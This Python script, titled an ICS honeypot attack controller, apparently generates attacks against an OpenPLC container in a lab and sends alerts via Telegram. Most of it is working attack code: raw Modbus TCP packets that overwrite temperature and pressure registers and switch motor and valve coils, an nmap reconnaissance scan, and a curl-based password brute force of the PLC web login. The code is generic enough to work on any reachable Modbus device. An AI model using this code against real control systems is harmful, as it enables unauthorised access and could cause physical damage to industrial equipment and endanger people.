#!/usr/bin/env python3
"""
ICS HONEYPOT - ATTACK CONTROLLER
"""

import socket
import struct
import time
import sys
import os
import re
import subprocess
import urllib.request
import urllib.parse


def load_dotenv(path=".env"):
    """Minimal .env loader — no extra pip dependency needed."""
    if not os.path.isfile(path):
        return
    try:
        with open(path) as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#") or "=" not in line:
                    continue
                key, _, value = line.partition("=")
                key = key.strip()
                value = value.strip().strip('"').strip("'")  # strip accidental quotes
                os.environ.setdefault(key, value)
    except OSError as e:
        print(f"  [WARN] could not read {path}: {e}")


load_dotenv()

# --- Secrets come from environment variables / .env file, never hardcoded ---
TELEGRAM_TOKEN = os.environ.get("TG_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TG_CHAT_ID", "")

if not TELEGRAM_TOKEN or not TELEGRAM_CHAT_ID:
    print("  [WARN] Telegram alerts disabled (TG_TOKEN / TG_CHAT_ID not set)")
else:
    print("  [OK] Telegram alerting enabled")


def send_telegram(msg):
    if not TELEGRAM_TOKEN or not TELEGRAM_CHAT_ID:
        return
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        data = urllib.parse.urlencode({"chat_id": TELEGRAM_CHAT_ID, "text": msg}).encode()
        req = urllib.request.Request(url, data=data, method="POST")
        urllib.request.urlopen(req, timeout=5)
    except urllib.error.HTTPError as e:
        body = e.read().decode(errors="replace")
        print(f"  [WARN] Telegram alert failed: HTTP {e.code} -> {body}")
    except (urllib.error.URLError, OSError) as e:
        print(f"  [WARN] Telegram alert failed: {e}")


def get_attacker_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except OSError:
        return "unknown"


def get_plc_ip():
    try:
        result = subprocess.run(
            "docker inspect openplc --format '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}'",
            shell=True, capture_output=True, text=True
        )
        ip = result.stdout.strip()
        if ip:
            return ip
    except (subprocess.SubprocessError, OSError) as e:
        print(f"  [WARN] docker inspect failed, using fallback IP: {e}")
    return "172.18.0.2"


PLC_IP       = get_plc_ip()
PLC_PORT     = 502
PLC_WEB_PORT = 8080
ATTACKER_IP  = get_attacker_ip()

TEMP_ADDR  = 1024
PRESS_ADDR = 1025
MOTOR_ADDR = 0
VALVE_ADDR = 1

# Valid range for Modbus holding registers (unsigned 16-bit)
REG_MIN, REG_MAX = 0, 65535

ATTACK_VALUES = [
    {"temp": 87,  "pressure": 34,  "motor": 1, "valve": 1},
    {"temp": 98,  "pressure": 123, "motor": 1, "valve": 0},
    {"temp": 123, "pressure": 67,  "motor": 0, "valve": 1},
]

NORMAL_VALUES = {"temp": 25, "pressure": 10, "motor": 1, "valve": 1}
LOG_FILE = "/var/log/openplc/attacks.log"


def write_register(address, value):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((PLC_IP, PLC_PORT))
        s.send(struct.pack('>HHHBBHH', 1, 0, 6, 1, 6, address, value))
        s.recv(1024)
        s.close()
        return True
    except (socket.error, struct.error, OSError) as e:
        print(f"  [ERROR] write_register({address}, {value}) failed: {e}")
        return False


def write_coil(address, value):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((PLC_IP, PLC_PORT))
        data = 0xFF00 if value else 0x0000
        s.send(struct.pack('>HHHBBHH', 1, 0, 6, 1, 5, address, data))
        s.recv(1024)
        s.close()
        return True
    except (socket.error, struct.error, OSError) as e:
        print(f"  [ERROR] write_coil({address}, {value}) failed: {e}")
        return False


def read_register(address):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((PLC_IP, PLC_PORT))
        s.send(struct.pack('>HHHBBHH', 1, 0, 6, 1, 3, address, 1))
        resp = s.recv(1024)
        s.close()
        if len(resp) >= 11:
            return struct.unpack('>H', resp[9:11])[0]
        return 0
    except (socket.error, struct.error, OSError) as e:
        print(f"  [ERROR] read_register({address}) failed: {e}")
        return 0


def read_coil(address):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((PLC_IP, PLC_PORT))
        s.send(struct.pack('>HHHBBHH', 1, 0, 6, 1, 1, address, 1))
        resp = s.recv(1024)
        s.close()
        if len(resp) >= 10:
            return 1 if resp[9] & 0x01 else 0
        return 0
    except (socket.error, struct.error, OSError) as e:
        print(f"  [ERROR] read_coil({address}) failed: {e}")
        return 0


def log(message):
    ts = time.strftime("%Y-%m-%d %H:%M:%S")
    try:
        os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
        with open(LOG_FILE, "a") as f:
            f.write(f"[{ts}] {message}\n")
    except OSError as e:
        print(f"  [WARN] could not write log file: {e}")


def wazuh_alert(attack_type):
    print(f"  [ALERT]  Event generated  ->  {attack_type}")
    print(f"  [WAZUH]  Alert forwarded to SIEM")


def check_connection():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((PLC_IP, PLC_PORT))
        s.close()
        return True
    except OSError:
        return False


def show_state():
    temp     = read_register(TEMP_ADDR)
    pressure = read_register(PRESS_ADDR)
    motor    = read_coil(MOTOR_ADDR)
    valve    = read_coil(VALVE_ADDR)
    print(f"  Temperature : {temp} C")
    print(f"  Pressure    : {pressure} bar")
    print(f"  Motor       : {'ON' if motor else 'OFF'}")
    print(f"  Valve       : {'ON' if valve else 'OFF'}")


def restore_normal():
    write_register(TEMP_ADDR, NORMAL_VALUES['temp'])
    write_register(PRESS_ADDR, NORMAL_VALUES['pressure'])
    write_coil(MOTOR_ADDR, NORMAL_VALUES['motor'])
    write_coil(VALVE_ADDR, NORMAL_VALUES['valve'])
    log("System restored to normal state")
    print("  [OK] PLC restored to safe operating values")
    print()
    show_state()


def modbus_attack(temp, pressure, motor, valve):
    motor = 1 if motor else 0
    valve = 1 if valve else 0
    print(f"  [BEFORE] Temp={read_register(TEMP_ADDR)}C  Pressure={read_register(PRESS_ADDR)} bar")
    write_register(TEMP_ADDR, temp)
    write_register(PRESS_ADDR, pressure)
    write_coil(MOTOR_ADDR, motor)
    write_coil(VALVE_ADDR, valve)
    time.sleep(0.5)
    print(f"  [AFTER]  Temp={read_register(TEMP_ADDR)}C  Pressure={read_register(PRESS_ADDR)} bar")
    print(f"  [COILS]  Motor={'ON' if motor else 'OFF'}  Valve={'ON' if valve else 'OFF'}")
    log(f"OPENPLC MODBUS ATTACK: Temp={temp}, Pressure={pressure} from {ATTACKER_IP}")
    send_telegram(f"MODBUS ATTACK\nAttacker: {ATTACKER_IP}\nTemp: {temp}C\nPressure: {pressure} bar\nMotor: {'ON' if motor else 'OFF'}\nValve: {'ON' if valve else 'OFF'}")
    print()
    wazuh_alert("MODBUS ATTACK")


def single_attack():
    print("\n" + "-" * 40)
    try:
        temp     = int(input("  Temp [999]: ") or "999")
        pressure = int(input("  Pressure [500]: ") or "500")
        motor    = int(input("  Motor 0/1 [1]: ") or "1")
        valve    = int(input("  Valve 0/1 [1]: ") or "1")

        if not (REG_MIN <= temp <= REG_MAX) or not (REG_MIN <= pressure <= REG_MAX):
            print(f"  [ERROR] Temp/Pressure must be between {REG_MIN} and {REG_MAX}")
            return
        if motor not in [0, 1] or valve not in [0, 1]:
            print("  [ERROR] Motor and Valve must be 0 or 1")
            return

        print("  Executing attack...\n")
        modbus_attack(temp, pressure, motor, valve)
    except ValueError as e:
        print(f"  [ERROR] Invalid input: {e}")


def run_recon_scan():
    print("\n" + "-" * 40)
    print("  RECONNAISSANCE SCAN")
    print(f"  Target : {PLC_IP}")
    print("-" * 40)
    log(f"OPENPLC RECON SCAN: Nmap scan from {ATTACKER_IP} target={PLC_IP}")

    print("  Scanning ports...")
    print("  Probing target host, this may take a moment...\n")
    time.sleep(30)

    try:
        result = subprocess.run(
            f"nmap -p 502,8080 {PLC_IP} -Pn -T4",
            shell=True, capture_output=True, text=True, timeout=30
        )
    except subprocess.TimeoutExpired:
        print("  [ERROR] nmap scan timed out")
        log("OPENPLC RECON SCAN: nmap timed out")
        input("\n  Press Enter to continue...")
        return

    if result.returncode != 0:
        print(f"  [ERROR] nmap failed (is it installed? permissions?): {result.stderr.strip()}")
        log("OPENPLC RECON SCAN: nmap failed")
        input("\n  Press Enter to continue...")
        return

    port502  = "open" if re.search(r"\b502/tcp\s+open\b", result.stdout)  else "closed/filtered"
    port8080 = "open" if re.search(r"\b8080/tcp\s+open\b", result.stdout) else "closed/filtered"

    print(f"  PORT      STATE          SERVICE")
    print(f"  502/tcp   {port502:<14} Modbus TCP")
    print(f"  8080/tcp  {port8080:<14} OpenPLC Web Interface")

    reachable = "open" in (port502, port8080)
    print(f"\n  Target is {'REACHABLE and VULNERABLE' if reachable else 'NOT REACHABLE'}")

    log(f"OPENPLC RECON SCAN: Completed from {ATTACKER_IP}")
    send_telegram(f"RECON SCAN\nAttacker: {ATTACKER_IP}\nTarget: {PLC_IP}\nPort 502: {port502}\nPort 8080: {port8080}")
    print()
    wazuh_alert("RECONNAISSANCE SCAN")
    input("\n  Press Enter to continue...")


def run_bruteforce():
    print("\n" + "-" * 40)
    print("  BRUTE FORCE ATTACK")
    print(f"  Target : {PLC_IP}:{PLC_WEB_PORT}")
    print("-" * 40)
    log(f"OPENPLC BRUTE FORCE: Password attack from {ATTACKER_IP} target={PLC_IP}:{PLC_WEB_PORT}")

    passwords = ["admin", "openplc", "password", "123456", "plc", "scada", "root", "1234", "tarik", "farrougi"]
    found     = False

    print("  Trying passwords...\n")
    print("  [INFO] success detection uses HTTP redirect (302) instead of status 200 alone.")
    print("  [INFO] Verify manually with 'curl -v' first if your OpenPLC version behaves differently.\n")

    for pwd in passwords:
        try:
            result = subprocess.run(
                f"curl -s -i -X POST http://{PLC_IP}:{PLC_WEB_PORT}/login "
                f"-d 'username=openplc&password={pwd}'",
                shell=True, capture_output=True, text=True, timeout=5
            )
        except subprocess.TimeoutExpired:
            print(f"  [ATTEMPT]  username: openplc   password: {pwd:<12}  ->  TIMEOUT")
            continue

        response   = result.stdout
        first_line = response.splitlines()[0] if response else ""
        success    = ("302" in first_line) or ("dashboard" in response.lower())

        if success:
            print(f"  [ATTEMPT]  username: openplc   password: {pwd:<12}  ->  SUCCESS")
            found = True
            break
        else:
            print(f"  [ATTEMPT]  username: openplc   password: {pwd:<12}  ->  FAILED")
        time.sleep(0.3)

    print()
    if found:
        print(f"  [SUCCESS]  Weak credentials detected")
        print(f"             Account : openplc")
        log(f"OPENPLC BRUTE FORCE: SUCCESS from {ATTACKER_IP}")
        send_telegram(f"BRUTE FORCE SUCCESS\nAttacker: {ATTACKER_IP}\nTarget: {PLC_IP}:{PLC_WEB_PORT}\nAccount: openplc")
    else:
        print(f"  [RESULT]   No weak credentials found")
        log(f"OPENPLC BRUTE FORCE: Failed from {ATTACKER_IP}")
        send_telegram(f"BRUTE FORCE FAILED\nAttacker: {ATTACKER_IP}\nTarget: {PLC_IP}:{PLC_WEB_PORT}")

    print()
    wazuh_alert("BRUTE FORCE ATTACK")
    input("\n  Press Enter to continue...")


def run_sequence():
    print("\n" + "-" * 40)
    print("  MODBUS ATTACK SEQUENCE")
    print("  Current PLC State:\n")
    show_state()
    input("\n  Press ENTER to start attack...")
    for i, v in enumerate(ATTACK_VALUES, 1):
        print(f"\n  [STEP {i}]  Injecting malicious values...")
        modbus_attack(v['temp'], v['pressure'], v['motor'], v['valve'])
        time.sleep(2)
    print("\n" + "-" * 40)
    restore_normal()


def main():
    print("\n" + "=" * 40)
    print("  ICS HONEYPOT - ATTACK CONTROLLER")
    print("=" * 40)

    if not check_connection():
        print(f"  [ERROR] Cannot connect to PLC at {PLC_IP}:{PLC_PORT}")
        return

    while True:
        print("\n" + "-" * 40)
        print("  1. Modbus Attack  (Single)")
        print("  2. Modbus Attack  (Sequence)")
        print("  3. Reconnaissance Scan")
        print("  4. Brute Force Attack")
        print("  5. Show PLC State")
        print("  6. Restore Normal")
        print("  0. Exit")
        print("-" * 40)

        choice = input("  > ")

        if choice == "1":
            single_attack()
        elif choice == "2":
            run_sequence()
        elif choice == "3":
            run_recon_scan()
        elif choice == "4":
            run_bruteforce()
        elif choice == "5":
            print()
            show_state()
        elif choice == "6":
            print()
            restore_normal()
        elif choice == "0":
            print("\n  Goodbye.\n")
            sys.exit(0)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n  Exiting...\n")
        sys.exit(0)
